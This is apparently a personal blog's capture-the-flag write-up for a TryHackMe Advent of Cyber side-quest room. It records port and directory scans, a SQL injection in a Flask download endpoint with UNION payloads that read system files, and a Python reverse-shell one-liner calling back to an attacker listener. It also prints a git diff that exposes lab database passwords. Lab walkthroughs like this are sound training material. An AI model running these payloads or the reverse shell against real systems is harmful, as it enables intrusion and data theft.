---
title: Advent Of Cyber (sq4)
author: reds
date: 2023-12-22 11:13
tags: [cybersecurity, ctf, writeup, TryHackMe]
pin: false
hidden: false
---

https://tryhackme.com/room/surfingyetiiscomingtotown

## Nmap 
- 22 (ssh)
- 8000 (http)

## Website at 8000
directory scan (gobuster)
- `/download`
- `/console`

### `/download`
Says to click images to download 3 svg files.
Burpsuite detects sqli at `http://$IP:8000/download?id=2'`
```python
# File "/home/mcskidy/app/app.py", line 28, in download
    file_id = request.args.get('id','')
    if file_id!='':
        cur = mysql.connection.cursor()
        query = "SELECT url FROM elves where url_id = '%s'" % (file_id)
        cur.execute(query)
        results = cur.fetchall()
        for url in results:
            filename = url[0]
            response_buf = BytesIO()
```

So the query executed is `SELECT url FROM elves where url_id = '%s'`

`http://$IP:8000/download?id=11'+UNION+SELECT+'file://///sys/class/net/eth0/address';--`

`http://$IP:8000/download?id=11'+UNION+SELECT+'file://///etc/machine-id';--`


get shell

```bash
# host
nc -lnv 10.9.129.243 4444
# target
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.129.243",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")
```

```bash
git show e9855c8a10cb97c287759f498c3314912b7f4713

 # MySQL configuration
 app.config['MYSQL_HOST'] = 'localhost'
-app.config['MYSQL_USER'] = 'root'
-app.config['MYSQL_PASSWORD'] = 'w6UV3tjxAuKCUWtP'
+app.config['MYSQL_USER'] = 'mcskidy'
+app.config['MYSQL_PASSWORD'] = 'F453TgvhALjZ'
 app.config['MYSQL_DB'] = 'elfimages'
 mysql = MySQL(app)

```


### `/console`
